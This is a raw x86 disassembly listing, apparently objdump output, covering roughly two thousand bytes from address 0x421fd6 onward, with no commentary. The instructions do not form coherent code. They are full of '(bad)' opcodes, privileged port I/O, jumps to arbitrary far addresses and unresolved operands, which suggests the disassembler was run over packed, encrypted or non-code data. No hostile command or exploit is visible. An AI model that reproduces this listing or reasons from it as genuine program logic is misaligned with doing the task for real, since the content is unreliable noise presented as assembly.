  421fd6:	xchg   DWORD PTR [ebx+0x77],eax
  421fd9:	dec    edi
  421fda:	push   ebp
  421fdb:	adc    esi,ebp
  421fdd:	xchg   ebp,eax
  421fde:	jmp    0x422056
  421fe0:	mov    esi,0xdd1db3bd
  421fe5:	and    DWORD PTR [eax],edi
  421fe7:	(bad)  
  421fe9:	test   al,0xe6
  421feb:	xchg   DWORD PTR [esi+0x24bc6e15],edi
  421ff1:	lahf   
  421ff2:	loope  0x421fa2
  421ff4:	retf   
  421ff5:	shr    ah,1
  421ff7:	dec    esp
  421ff8:	popa   
  421ff9:	jecxz  0x421f91
  421ffb:	aam    0x30
  421ffd:	outs   dx,DWORD PTR ds:[esi]
  421ffe:	addr16 pop ebp
  422000:	add    DWORD PTR [eax-0xd3a6731],esp
  422006:	jmp    0x421fcd
  422008:	daa    
  422009:	jnp    0x422053
  42200b:	imul   ecx,DWORD PTR [ecx],0xd2ce0004
  422011:	lds    edi,FWORD PTR [ebx+0x16]
  422014:	push   ss
  422015:	ins    DWORD PTR es:[edi],dx
  422016:	jns    0x422074
  422018:	mov    edx,0xb615a7c8
  42201d:	add    al,0xd5
  42201f:	sub    al,0x85
  422021:	in     al,dx
  422022:	in     al,dx
  422023:	jle    0x4220a2
  422025:	xchg   edi,eax
  422027:	cld    
  422028:	mov    al,0xdc
  42202a:	xor    esp,DWORD PTR [edi+edi*2]
  42202d:	jmp    DWORD PTR [esi-0x2728c51d]
  422033:	les    esp,FWORD PTR [esi-0x445423b3]
  422039:	ret    
  42203a:	jae    0x422019
  42203c:	pop    edx
  42203d:	setl   BYTE PTR [ecx]
  422040:	idiv   BYTE PTR [edi+ebp*8+0x5190e1]
  422047:	mov    edi,0x2d197244
  42204c:	mov    ebp,0x9c40efd1
  422051:	jae    0x421fda
  422053:	mov    esi,0x3f2a6d0a
  422058:	mov    ds:0x19870e0e,eax
  42205d:	adc    esi,DWORD PTR [ebx-0x20]
  422060:	into   
  422061:	bound  eax,QWORD PTR [edi+0x31]
  422064:	or     al,0x7
  422066:	fisub  DWORD PTR [eax]
  422068:	ja     0x422022
  42206a:	mov    edi,0x17a605f6
  42206f:	jnp    0x42207a
  422071:	jp     0x422078
  422073:	cwde   
  422074:	jg     0x42204e
  422076:	fst    QWORD PTR [ebp-0x525cff7c]
  42207c:	jmp    0x422051
  42207e:	xchg   edi,eax
  42207f:	out    0xe5,eax
  422081:	(bad)  
  422082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422083:	inc    ecx
  422084:	call   DWORD PTR [edx-0x75ed09ee]
  42208a:	jle    0x4220b2
  42208c:	cld    
  42208d:	push   0x41f38bd3
  422092:	fstp   TBYTE PTR [esi+0x607f314f]
  422098:	imul   esp,DWORD PTR ds:0x6b83bae4,0xffffffc4
  42209f:	sub    al,0xa7
  4220a1:	mov    bh,0x9c
  4220a3:	fisub  WORD PTR [edi+0x1b]
  4220a6:	out    0x19,al
  4220a8:	cmc    
  4220a9:	mov    fs,WORD PTR [esi-0x12]
  4220ac:	push   0xffffffb8
  4220ae:	ret    0x17ab
  4220b1:	lds    edi,FWORD PTR [edi]
  4220b3:	adc    DWORD PTR [ecx+0x1e],0xfffffffd
  4220b7:	pop    ebx
  4220b8:	in     al,0x36
  4220ba:	sbb    dh,ch
  4220bc:	dec    esp
  4220bd:	ins    DWORD PTR es:[edi],dx
  4220be:	add    edi,DWORD PTR [edx+0x4cc03882]
  4220c4:	mov    al,0x1b
  4220c6:	cwde   
  4220c7:	popf   
  4220c8:	stos   DWORD PTR es:[edi],eax
  4220c9:	sub    al,0xda
  4220cb:	call   0x86b10aaf
  4220d0:	call   0x12a6cadd
  4220d5:	xor    ecx,edx
  4220d7:	iret   
  4220d8:	dec    ecx
  4220d9:	mov    cl,BYTE PTR [edx+0x780e6d34]
  4220df:	inc    edi
  4220e0:	je     0x422100
  4220e2:	cmp    edx,0xffffffd9
  4220e5:	adc    BYTE PTR [edi],0xea
  4220e8:	mov    ?,WORD PTR [ecx+0x41c93e11]
  4220ee:	retf   
  4220ef:	push   0x71
  4220f1:	mov    fs,WORD PTR [ebp-0x4442d7ff]
  4220f7:	sub    BYTE PTR [edx],bh
  4220f9:	jmp    0x4220f3
  4220fb:	inc    ebx
  4220fc:	push   cs
  4220fd:	das    
  4220fe:	mov    ebp,DWORD PTR [edx]
  422100:	xchg   esi,eax
  422101:	adc    DWORD PTR ss:[eax+0xb],ebp
  422105:	jno    0x422157
  422107:	pop    ecx
  422108:	xor    al,0x98
  42210a:	call   0xdcca:0x3468d466
  422111:	lods   eax,DWORD PTR ds:[esi]
  422112:	xlat   BYTE PTR ds:[ebx]
  422113:	(bad)  
  422114:	jp     0x42214f
  422116:	push   ecx
  422117:	cld    
  422118:	shl    eax,0xa4
  42211b:	sbb    al,0x95
  42211d:	and    BYTE PTR [ecx],ah
  42211f:	inc    esi
  422120:	dec    ebx
  422121:	pop    esi
  422122:	rcr    DWORD PTR [ebx+0x4f6fee6],0xe2
  422129:	dec    edx
  42212a:	sbb    BYTE PTR [ebp-0x39],0x77
  42212e:	in     eax,dx
  42212f:	call   0x6afcda03
  422134:	push   edi
  422135:	retf   0x1c9c
  422138:	in     al,dx
  422139:	fldcw  WORD PTR [ecx+0x68642a87]
  42213f:	mov    ds:0xfdfff1fa,eax
  422144:	dec    edx
  422145:	mov    cl,0x88
  422147:	pusha  
  422148:	mov    ebx,eax
  42214a:	xor    edi,esp
  42214c:	push   0xffffffcd
  42214e:	or     DWORD PTR ds:0x14677a9c,ebp
  422154:	fsub   DWORD PTR [ecx-0xe]
  422157:	popf   
  422158:	lods   eax,DWORD PTR ds:[esi]
  422159:	pop    eax
  42215a:	mov    DWORD PTR [esi],edx
	...
  4221a4:	add    BYTE PTR [eax],al
  4221a6:	adc    eax,0xfe3de0ab
  4221ab:	jg     0x42218a
  4221ad:	stos   DWORD PTR es:[edi],eax
  4221ae:	mov    esi,DWORD PTR [edi+0x4c7ed01b]
  4221b4:	es jmp 0x71e:0x11307
  4221bc:	add    BYTE PTR [eax],al
  4221be:	and    al,0xd1
  4221c0:	push   0x7dbfdc67
  4221c5:	lods   eax,DWORD PTR ds:[esi]
  4221c6:	and    eax,DWORD PTR [eax+ebx*2+0x5a5b3924]
  4221cd:	sbb    BYTE PTR [eax],bh
  4221cf:	aam    0x44
  4221d1:	inc    edi
  4221d2:	jp     0x4221d3
  4221d4:	test   DWORD PTR [esi+0x5e],eax
  4221d7:	add    DWORD PTR [edi],edx
  4221d9:	push   ds
  4221da:	jl     0x4221ab
  4221dc:	xchg   ecx,eax
  4221dd:	lock jbe 0x4221fc
  4221e0:	push   ebx
  4221e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221e2:	pop    esi
  4221e3:	mov    ch,0x2f
  4221e5:	mov    edx,0xb5b4334b
  4221ea:	or     ch,BYTE PTR [ecx]
  4221ec:	xor    eax,0x6febe10f
  4221f1:	mov    edi,0xa3a46bd6
  4221f6:	(bad)
  4221f9:	popf   
  4221fa:	xor    DWORD PTR [ebx+0x71],0x57
  4221fe:	mov    bl,0x56
  422200:	(bad)  
  422201:	les    edi,FWORD PTR [edi-0x26]
  422204:	retf   
  422205:	mov    bh,0x17
  422207:	jge    0x4221a8
  422209:	or     al,0x90
  42220b:	jge    0x422268
  42220d:	mov    ds:0x30822809,eax
  422212:	int3   
  422213:	popf   
  422214:	mov    ebx,edx
  422216:	lock adc bh,dl
  422219:	mov    dl,0xc4
  42221b:	jo     0x4221d2
  42221d:	in     eax,dx
  42221e:	jge    0x422298
  422220:	(bad)  
  422221:	mov    bl,0x51
  422223:	mov    ebx,0x616d31b
  422228:	mov    esi,0xa7348bf7
  42222d:	push   0xd1115d84
  422232:	shr    DWORD PTR gs:[eax],0xdd
  422236:	cmp    DWORD PTR [esi-0xac99058],0xffffffbb
  42223d:	push   ebp
  42223e:	adc    BYTE PTR [edx+eax*2-0x74],bl
  422242:	loopne 0x4222ac
  422244:	sar    DWORD PTR [edi-0x4fa93518],0x9b
  42224b:	dec    BYTE PTR [edi-0x25]
  42224e:	jns    0x4221f1
  422250:	mov    ebp,esi
  422252:	sahf   
  422253:	addr16 int3 
  422255:	or     BYTE PTR ss:[eax+ebx*8-0x67],0x89
  42225b:	daa    
  42225c:	xchg   ebx,eax
  42225d:	mov    ah,0xf7
  42225f:	outs   dx,BYTE PTR ds:[esi]
  422260:	xchg   ebp,eax
  422261:	mov    dh,0x67
  422263:	mov    al,ds:0x91f2d606
  422268:	xchg   edi,eax
  422269:	mov    ebx,0x501cd2e0
  42226e:	lds    ebp,FWORD PTR [eax]
  422270:	nop
  422271:	and    DWORD PTR [edi-0x7ec5911e],ecx
  422277:	aas    
  422278:	dec    esi
  422279:	popa   
  42227a:	neg    BYTE PTR [esi+0x18]
  42227d:	jge    0x4222ea
  42227f:	cmp    ch,bh
  422281:	mov    ds:0xf6a621cb,eax
  422286:	mov    ecx,ebp
  422288:	fild   DWORD PTR [ebp-0xd]
  42228b:	fist   DWORD PTR ds:0x4ebc77c3
  422291:	xor    al,0xde
  422293:	dec    ebx
  422294:	sbb    al,0x39
  422296:	xchg   edi,eax
  422297:	fidivr WORD PTR ds:0x271c16a
  42229d:	shr    BYTE PTR [esi-0x77],cl
  4222a0:	sbb    edx,DWORD PTR [ecx]
  4222a2:	fist   WORD PTR [ecx-0x20]
  4222a5:	les    esp,FWORD PTR [ecx+0x2c8c8d20]
  4222ab:	lds    edi,FWORD PTR [edi+0x51]
  4222ae:	xchg   ecx,eax
  4222af:	jb     0x4222f2
  4222b1:	call   0x2128fc78
  4222b6:	cmp    BYTE PTR [eax-0x66a8d0c9],bh
  4222bc:	cmp    eax,0x2e16236
  4222c1:	xchg   edx,eax
  4222c2:	repnz loopne 0x4222d2
  4222c5:	and    cl,dh
  4222c7:	xor    DWORD PTR [ebx+0x13],eax
  4222ca:	push   ecx
  4222cb:	pop    edx
  4222cc:	(bad)  
  4222cd:	cld    
  4222ce:	sub    bl,BYTE PTR [edx-0x75]
  4222d1:	(bad)  
  4222d2:	jecxz  0x422312
  4222d4:	mov    ebp,0xef794a3e
  4222d9:	mov    eax,ds:0x9220a7bf
  4222de:	jb     0x4222e9
  4222e0:	sub    DWORD PTR [edx+0x6b],ecx
  4222e3:	push   eax
  4222e4:	pop    esp
  4222e5:	dec    BYTE PTR [eax+0x71]
  4222e8:	xchg   esp,eax
  4222e9:	inc    ecx
  4222ea:	xlat   BYTE PTR ds:[ebx]
  4222eb:	mov    BYTE PTR [edx-0x69],dl
  4222ee:	cld    
  4222ef:	mov    ds:0x97910828,eax
  4222f4:	(bad)  
  4222f5:	enter  0x4af3,0x81
  4222f9:	or     eax,0x2f0ed05e
  4222fe:	adc    al,0x3a
  422300:	dec    edi
  422301:	jge    0x4222c9
  422303:	pushf  
  422304:	leave  
  422305:	and    al,0x9e
  422307:	mov    bl,0x2e
  422309:	in     al,dx
  42230a:	cmp    BYTE PTR [ecx+eiz*4-0x31a54b0c],dl
  422311:	das    
  422312:	mov    dl,0xa7
  422314:	cmp    DWORD PTR [ebx],esi
  422316:	dec    edx
  422317:	push   es
  422318:	pop    esi
  422319:	aas    
  42231a:	sbb    eax,0x30459288
  42231f:	out    dx,eax
  422320:	cmp    dl,cl
  422322:	aas    
  422323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422324:	fs hlt 
  422326:	xor    esi,edi
  422328:	iret   
  422329:	xchg   edx,eax
  42232a:	lods   eax,DWORD PTR ds:[esi]
  42232b:	repnz push cs
  42232d:	push   esp
  42232e:	vaddsubps xmm1,xmm7,xmm5
  422332:	lods   al,BYTE PTR ds:[esi]
  422333:	scas   al,BYTE PTR es:[edi]
  422334:	jmp    0x59e0:0x6b9f351f
  42233b:	rcl    DWORD PTR [eax],0x8f
  42233e:	push   es
  42233f:	push   ss
  422340:	and    DWORD PTR [edx-0xe],0xd5400b90
  422347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422348:	test   eax,0xbe3938ad
  42234d:	outs   dx,DWORD PTR ds:[esi]
  42234e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42234f:	pop    ecx
  422350:	mov    ds:0xdc0aacdf,al
  422355:	pop    esi
  422356:	sbb    cl,BYTE PTR ds:0x9e788b48
  42235c:	jnp    0x42234d
  42235e:	mov    edi,0xbbacaba3
  422363:	xchg   esp,eax
  422364:	mov    dl,0x1c
  422366:	std    
  422367:	jne    0x4223a5
  422369:	xlat   BYTE PTR ds:[ebx]
  42236a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42236b:	fs push edi
  42236d:	outs   dx,DWORD PTR ds:[esi]
  42236e:	test   al,0x69
  422370:	test   BYTE PTR ds:0xe577be33,bh
  422376:	dec    ecx
  422377:	push   ds
  422378:	xor    al,0x4a
  42237a:	xor    DWORD PTR [ecx-0x5c081b9],edi
  422380:	mov    dl,0x2b
  422382:	ja     0x4223ac
  422384:	cmp    ch,ch
  422386:	dec    edi
  422387:	ret    
  422388:	inc    ebp
  422389:	dec    ebx
  42238a:	jle    0x422401
  42238c:	fcmovnu st,st(0)
  42238e:	psrld  mm1,QWORD PTR [ebx]
  422391:	shr    edx,0xcb
  422394:	out    0x63,al
  422396:	dec    eax
  422397:	mov    ds:0xd70e78c4,eax
  42239c:	mov    ch,dh
  42239e:	and    edi,DWORD PTR [esi-0x36]
  4223a1:	jno    0x4223c8
  4223a3:	pop    ecx
  4223a4:	retf   0x87be
  4223a7:	jnp    0x422381
  4223a9:	mov    ds:0x57c0bce8,eax
  4223ae:	and    DWORD PTR [edi+0x3b],ebp
  4223b1:	and    edx,DWORD PTR [edi-0x74f1356a]
  4223b7:	repnz pop ds
  4223b9:	aam    0x1c
  4223bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223bc:	push   ds
  4223bd:	sub    eax,0x2fe6ecbd
  4223c2:	dec    esp
  4223c3:	fidiv  WORD PTR [eax+ebp*2+0xf]
  4223c7:	int3   
  4223c8:	mov    esi,esp
  4223ca:	fstp   DWORD PTR [ebp+0x3263fa21]
  4223d0:	add    eax,0x601fc472
  4223d5:	cmp    al,0x23
  4223d7:	shl    ch,cl
  4223d9:	(bad)  
  4223da:	bound  esi,QWORD PTR [ebp+0x65eddc64]
  4223e0:	ror    BYTE PTR [ebp+0x4d6c55b3],0x1b
  4223e7:	pop    edx
  4223e8:	mov    ebx,0xe7192687
  4223ed:	loop   0x422439
  4223ef:	xlat   BYTE PTR ds:[ebx]
  4223f0:	(bad)  
  4223f1:	mov    al,0x35
  4223f3:	fsubr  DWORD PTR [esi-0x8]
  4223f6:	xor    dh,BYTE PTR ds:[eax]
  4223f9:	mov    WORD PTR [esi+0x4a3252e8],?
  4223ff:	pop    ecx
  422400:	loopne 0x42240e
  422402:	fmul   st,st(2)
  422404:	aaa    
  422405:	test   eax,0x2f91bd6d
  42240a:	call   0x387c5910
  42240f:	jmp    0x95a:0x9ad88105
  422416:	dec    eax
  422417:	mov    ds:0x761c38f5,al
  42241c:	and    al,0x94
  42241e:	jge    0x422478
  422420:	(bad)  [edi-0x3df58b94]
  422426:	call   0xe6bda8c6
  42242b:	loop   0x4223fa
  42242d:	adc    ah,cl
  42242f:	xchg   BYTE PTR [ecx],bh
  422431:	int3   
  422432:	cld    
  422433:	and    eax,0x294660a8
  422438:	inc    edx
  422439:	dec    ebx
  42243a:	(bad)  
  42243b:	jne    0x422446
  42243d:	dec    edx
  42243e:	adc    ah,dl
  422440:	jne    0x4223cd
  422442:	sbb    BYTE PTR cs:[ecx],0xf5
  422446:	sahf   
  422447:	out    dx,al
  422448:	in     al,0xe2
  42244a:	mov    dl,BYTE PTR [edi]
  42244c:	xchg   ecx,eax
  42244d:	jmp    0x422460
  42244f:	jae    0x422408
  422451:	sbb    bl,BYTE PTR [ebp-0x4f]
  422454:	aam    0xce
  422456:	loop   0x422413
  422458:	call   0xf69d8a65
  42245d:	loop   0x4223e8
  42245f:	pop    ds
  422460:	outs   dx,BYTE PTR ds:[esi]
  422461:	dec    edi
  422462:	(bad)  
  422464:	pop    es
  422465:	mov    al,ds:0x708c7a09
  42246a:	xchg   DWORD PTR [edx-0x289bc937],edx
  422470:	jmp    0x7b2b9d66
  422475:	push   edi
  422476:	lock sbb ecx,DWORD PTR [ecx]
  422479:	cmp    esp,DWORD PTR [ebx+0x6b]
  42247c:	test   al,0xa5
  42247e:	out    dx,eax
  42247f:	mov    ecx,0x66f4e62b
  422484:	test   BYTE PTR [edi-0x1f1cff8f],al
  42248a:	mov    eax,ds:0xdac86d3b
  42248f:	into   
  422490:	fstp   QWORD PTR [ecx]
  422492:	push   ds
  422493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422494:	xor    DWORD PTR [edx+0x79],0xffffffd8
  422498:	es xchg ebp,eax
  42249a:	stc    
  42249b:	out    dx,eax
  42249c:	stos   BYTE PTR es:[edi],al
  42249d:	and    eax,0xf5487f52
  4224a2:	adc    bh,BYTE PTR [edi-0x5d]
  4224a5:	(bad)  
  4224a7:	mov    dl,0x28
  4224a9:	or     ch,ch
  4224ab:	pop    ecx
  4224ac:	sub    al,0x45
  4224ae:	clc    
  4224af:	bound  ebp,QWORD PTR [ecx]
  4224b1:	loope  0x42244d
  4224b3:	xchg   edi,eax
  4224b4:	mov    ebp,0xd535a38
  4224b9:	add    bh,BYTE PTR [eax]
  4224bb:	(bad)  
  4224bc:	mov    ebx,0x70bc982a
  4224c1:	mov    al,ds:0xc3f4e2e6
  4224c6:	pop    esi
  4224c7:	sub    BYTE PTR [eax-0x4b1b8ddb],dl
  4224cd:	inc    esi
  4224ce:	adc    BYTE PTR [esi+ebx*2-0x25286727],0xd4
  4224d6:	mov    ds:0x60839c7,al
  4224db:	pop    edi
  4224dc:	addr16 fsubr st(2),st
  4224df:	sub    bh,BYTE PTR [ecx+0x6e]
  4224e2:	jl     0x422551
  4224e4:	or     DWORD PTR [eax+0x5],0xffffff90
  4224e8:	xor    al,0x23
  4224ea:	daa    
  4224eb:	shl    cl,cl
  4224ed:	pop    esi
  4224ee:	and    al,0x1c
  4224f0:	sub    edx,ebp
  4224f2:	out    0xe9,eax
  4224f4:	push   esp
  4224f5:	loopne 0x42253e
  4224f7:	ins    BYTE PTR es:[edi],dx
  4224f8:	ror    BYTE PTR [edi-0x9],0x7d
  4224fc:	jo     0x4224c6
  4224fe:	mov    DWORD PTR ds:0x1b07df6c,0xfa460532
  422508:	ins    BYTE PTR es:[edi],dx
  422509:	mov    dh,0xfa
  42250b:	test   eax,ebp
  42250d:	push   ds
  42250e:	inc    esp
  42250f:	rol    DWORD PTR [ebp-0x5c],0x99
  422513:	and    al,0xeb
  422515:	mov    DWORD PTR [esi-0x7e6fe46a],0xa28de47d
  42251f:	sar    BYTE PTR [eax+0xb],cl
  422522:	xchg   esp,eax
  422523:	sbb    edx,DWORD PTR [esi]
  422525:	jge    0x42252c
  422527:	push   edx
  422528:	xchg   DWORD PTR [ebx+ebp*1],ebx
  42252b:	or     al,0xec
  42252d:	pop    es
  42252e:	clc    
  42252f:	je     0x42251d
  422531:	add    BYTE PTR [esi+0x60],bh
  422534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422535:	sub    BYTE PTR [ebx+ecx*2-0x5d9c30cd],dh
  42253c:	loope  0x422593
  42253e:	push   ss
  42253f:	jp     0x42252f
  422541:	js     0x42255f
  422543:	and    dl,BYTE PTR [esi]
  422545:	stos   BYTE PTR es:[edi],al
  422546:	repz setne BYTE PTR [edi+0x7cec203a]
  42254e:	cdq    
  42254f:	dec    esi
  422550:	in     eax,0x88
  422552:	pop    ebx
  422553:	jnp    0x4225c3
  422555:	cli    
  422556:	sub    ebx,DWORD PTR [edi-0x7f19657a]
  42255c:	pushf  
  42255d:	adc    eax,0x2a9af805
  422562:	inc    esp
  422563:	jne    0x4225b0
  422565:	aaa    
  422566:	jae    0x42254a
  422568:	sbb    al,0xe7
  42256a:	fwait
  42256b:	push   edi
  42256c:	adc    edi,DWORD PTR [esi-0x5e43b217]
  422572:	sub    ah,BYTE PTR [ebx]
  422574:	enter  0x4c7e,0xf8
  422578:	neg    DWORD PTR [ebx]
  42257a:	jge    0x422581
  42257c:	stos   BYTE PTR es:[edi],al
  42257d:	fs dec edi
  42257f:	ds leave 
  422581:	pop    ss
  422582:	test   eax,0xa5a676c6
  422587:	add    al,BYTE PTR [eax]
  422589:	mov    esi,0x7a91164e
  42258e:	cmc    
  42258f:	add    eax,0xf1719614
  422594:	outs   dx,DWORD PTR ds:[esi]
  422595:	jmp    0xa12:0xf5cbca03
  42259c:	mov    al,ds:0x84863b38
  4225a1:	pop    eax
  4225a2:	test   BYTE PTR [ecx+0x24],bh
  4225a5:	push   ebp
  4225a6:	fmul   st(6),st
  4225a8:	outs   dx,BYTE PTR ds:[esi]
  4225a9:	fiadd  WORD PTR ds:0xb3e11771
  4225af:	es pushf 
  4225b1:	jmp    0xa7274390
  4225b6:	push   0x8991ef7b
  4225bb:	push   ebx
  4225bc:	stos   BYTE PTR es:[edi],al
  4225bd:	cli    
  4225be:	sub    esi,ebx
  4225c0:	xlat   BYTE PTR ds:[ebx]
  4225c1:	mov    ebp,0xb487e01a
  4225c6:	push   ds
  4225c7:	mov    ebp,0xeb5055c3
  4225cc:	rcr    DWORD PTR [esi+0x53],0x77
  4225d0:	retf   
  4225d1:	fmul   QWORD PTR [ebp-0x49]
  4225d4:	xchg   BYTE PTR [edx],al
  4225d6:	in     al,0x4d
  4225d8:	mov    edx,0x1ecaa240
  4225dd:	inc    esi
  4225de:	inc    esp
  4225df:	popa   
  4225e0:	jle    0x42261b
  4225e2:	mov    ebx,0xaf3cf505
  4225e7:	pop    ebx
  4225e8:	sub    bh,BYTE PTR ds:0x45e314d9
  4225ee:	or     dl,dl
  4225f0:	jns    0x42262c
  4225f2:	pop    eax
  4225f3:	jle    0x42257f
  4225f5:	scas   eax,DWORD PTR es:[edi]
  4225f6:	sub    ch,BYTE PTR [esi-0x579a3a73]
  4225fc:	dec    edx
  4225fd:	loope  0x422624
  4225ff:	or     eax,0x3f04385a
  422604:	mov    dh,BYTE PTR [esi+0xe]
  422607:	xor    eax,DWORD PTR [ebp+0x25]
  42260a:	mov    bl,BYTE PTR [esi]
  42260c:	add    bl,cl
  42260e:	xor    ebx,eax
  422610:	mov    ds:0x211594ea,al
  422615:	pop    ds
  422616:	dec    esi
  422617:	and    dl,ch
  422619:	jp     0x42260e
  42261b:	addr16 dec ebp
  42261d:	fmul   QWORD PTR es:0xb4517421
  422624:	sub    ah,BYTE PTR [ecx-0xc]
  422627:	xchg   esi,eax
  422628:	sar    edi,1
  42262a:	xlat   BYTE PTR ds:[ebx]
  42262b:	inc    esp
  42262c:	popa   
  42262d:	mov    bh,0x42
  42262f:	xor    dl,bh
  422631:	rep lods eax,DWORD PTR ds:[esi]
  422633:	rcl    ecx,1
  422635:	jl     0x422646
  422637:	adc    al,0xe1
  422639:	js     0x422645
  42263b:	jge    0x4226b1
  42263d:	push   cs
  42263e:	stos   BYTE PTR es:[edi],al
  42263f:	sub    DWORD PTR [ecx+0x1d],0x4
  422643:	and    eax,0xa136ee1d
  422648:	ja     0x4225e7
  42264a:	inc    ebx
  42264b:	jp     0x4225e4
  42264d:	push   es
  42264e:	push   ebp
  42264f:	shl    DWORD PTR [edx+ebp*4+0x1e],0x9c
  422654:	pop    esp
  422655:	imul   eax,DWORD PTR ds:0x3a847b64,0xda2d4f54
  42265f:	push   edi
  422660:	xor    DWORD PTR [ebx+0x47e0cf],ebp
  422666:	ins    BYTE PTR es:[edi],dx
  422667:	ins    DWORD PTR es:[edi],dx
  422668:	out    0xef,al
  42266a:	shr    edi,0xdf
  42266d:	push   ds
  42266e:	arpl   ax,cx
  422670:	out    0xfb,eax
  422672:	add    eax,0x9d43e5c3
  422677:	and    ecx,ebp
  422679:	loopne 0x4226ec
  42267b:	dec    eax
  42267c:	cmc    
  42267d:	sub    edx,ebx
  42267f:	add    esi,DWORD PTR ds:0xa891ddf6
  422685:	pop    ebp
  422686:	xchg   BYTE PTR [esi+0x4b0b2e79],bl
  42268c:	popf   
  42268d:	mov    esi,0x9124ecd9
  422692:	mov    ah,0x3b
  422694:	ins    DWORD PTR es:[edi],dx
  422695:	cwde   
  422696:	shr    BYTE PTR [ebx-0x97dce51],0xa0
  42269d:	outs   dx,DWORD PTR ds:[esi]
  42269e:	sub    DWORD PTR [edx+ebp*2+0x5a],ebp
  4226a2:	dec    esp
  4226a3:	enter  0xdff0,0xae
  4226a7:	jge    0x42269a
  4226a9:	pop    esp
  4226aa:	call   0x4337dc88
  4226af:	repz popf 
  4226b1:	call   0xbeb4bf1f
  4226b6:	jmp    0x42263c
  4226b8:	ret    
  4226b9:	mov    bl,0x34
  4226bb:	mov    edx,0x3c89a20b
  4226c0:	jge    0x42270c
  4226c2:	jecxz  0x4226d1
  4226c4:	push   cs
  4226c5:	push   ecx
  4226c6:	out    0xbf,eax
  4226c8:	mov    cl,0xbe
  4226ca:	call   FWORD PTR [esi]
  4226cc:	icebp  
  4226cd:	inc    eax
  4226ce:	loopne 0x4226bf
  4226d0:	xchg   ebx,eax
  4226d1:	sbb    eax,0x69fca8bb
  4226d6:	dec    ecx
  4226d7:	dec    ecx
  4226d8:	mov    al,0x4e
  4226da:	xchg   ebp,eax
  4226db:	mov    ch,BYTE PTR [edx+0x460091c0]
  4226e1:	push   cs
  4226e2:	popa   
  4226e3:	shl    ch,0x1d
  4226e6:	xchg   esi,eax
  4226e7:	div    BYTE PTR [edi]
  4226e9:	mov    ebx,0x2e203be2
  4226ee:	jl     0x4226ab
  4226f0:	add    BYTE PTR [ecx],ah
  4226f2:	outs   dx,DWORD PTR ds:[esi]
  4226f3:	inc    esp
  4226f4:	neg    ah
  4226f6:	mov    eax,DWORD PTR [ebp+0x448c93ed]
  4226fc:	add    DWORD PTR [esi+0x22],edx
  4226ff:	cmp    dl,BYTE PTR [eax+0x1fc46fd]
  422705:	adc    ah,BYTE PTR [edi-0x3]
  422708:	leave  
  422709:	sub    al,0xb4
  42270b:	fmul   QWORD PTR [ecx-0xa]
  42270e:	test   BYTE PTR cs:[esi+0x701a931b],cl
  422715:	mov    WORD PTR [eax+eax*1],fs
  422718:	dec    edx
  422719:	pop    edx
  42271a:	xor    cl,dl
  42271c:	stos   BYTE PTR es:[edi],al
  42271d:	sub    BYTE PTR [edx-0x566d9dfb],al
  422723:	cmp    eax,0x145cb6a0
  422728:	jb     0x42271d
  42272a:	cmp    edi,ebx
  42272c:	add    BYTE PTR [ebx],0x1b
  42272f:	sahf   
  422730:	inc    DWORD PTR [ebx+0xf8fa6e6]
  422736:	xchg   ebx,eax
  422737:	out    dx,eax
  422738:	fcmovnu st,st(2)
  42273a:	pop    eax
  42273b:	fistp  DWORD PTR [eax+edx*4+0x59]
  42273f:	popf   
  422740:	xor    eax,0x71202a19
  422745:	dec    BYTE PTR [esi]
  422747:	mov    ebp,0x59382966
  42274c:	enter  0x7d22,0xd4
  422750:	mov    bh,BYTE PTR ds:[eax]
  422753:	aas    
  422754:	sub    esi,DWORD PTR [edi]
  422756:	clc    
  422757:	out    dx,eax
  422758:	inc    esp
  422759:	in     al,dx
  42275a:	dec    edi
  42275b:	ffree  st(2)
  42275d:	lods   al,BYTE PTR ds:[esi]
  42275e:	mov    eax,ds:0xf92a8b54
  422763:	sbb    BYTE PTR ds:0x32c08403,al
  422769:	jg     0x42275f
  42276b:	xor    al,0x44
  42276d:	iret   
  42276e:	lock mov edi,?
  422771:	inc    ebp
  422772:	cmc    
  422773:	aas    
  422774:	fwait
  422775:	mov    edx,0x92c376e9
  42277a:	shl    cl,1
  42277c:	nop
  42277d:	inc    esi
  42277e:	out    dx,al
  42277f:	ins    BYTE PTR es:[edi],dx
  422780:	and    dl,BYTE PTR [edi+0x35]
  422783:	pop    esi
  422784:	mov    ecx,0x19fb08cb
  422789:	pop    edi
  42278a:	iret   
  42278b:	mov    BYTE PTR [edx+eax*1+0x12f52a03],bl
  422792:	les    edx,FWORD PTR [ebp+0x5ad85209]
  422798:	dec    esi
  422799:	adc    cl,ch
  42279b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42279c:	clc    
  42279d:	inc    eax
  42279e:	gs ds mov eax,0x5c4b2276
  4227a5:	xrelease xchg BYTE PTR [ecx+0x3a],dl
  4227a9:	pop    esi
  4227ab:	pushf  
  4227ac:	aas    
  4227ad:	mul    dh
  4227af:	sub    ebx,DWORD PTR [edx+0x46]
  4227b2:	test   eax,0xb29fc641
  4227b7:	sub    eax,0x23fc4d4c
  4227bc:	pop    edi
  4227bd:	sub    eax,0xb8a6e4bf
  4227c2:	mov    eax,ds:0xf2cbc4f4
  4227c7:	popf   
  4227c8:	ins    DWORD PTR es:[edi],dx
  4227c9:	sbb    BYTE PTR [ecx+0x17],0x20
  4227cd:	pusha  
  4227ce:	test   eax,0xf313aaef
  4227d3:	imul   esp,DWORD PTR [ebx],0x4487af93
  4227d9:	out    dx,al
  4227da:	jl     0x422803
  4227dc:	and    ebx,eax
  4227de:	dec    eax
  4227df:	stos   DWORD PTR es:[edi],eax
  4227e0:	test   BYTE PTR [ecx-0x44e2649f],dl
  4227e6:	in     eax,dx
  4227e7:	jmp    0xebc7ac43
  4227ec:	and    ebx,DWORD PTR [eax]
  4227ee:	add    DWORD PTR [ecx-0x63],edx
  4227f1:	mov    al,ds:0xd085b235
  4227f6:	sbb    ecx,esi
  4227f8:	mov    cs,WORD PTR [ebx]
  4227fa:	mov    dh,bh
  4227fc:	sbb    BYTE PTR [ebp+0xf],ah
  4227ff:	and    eax,0x7b551c0d
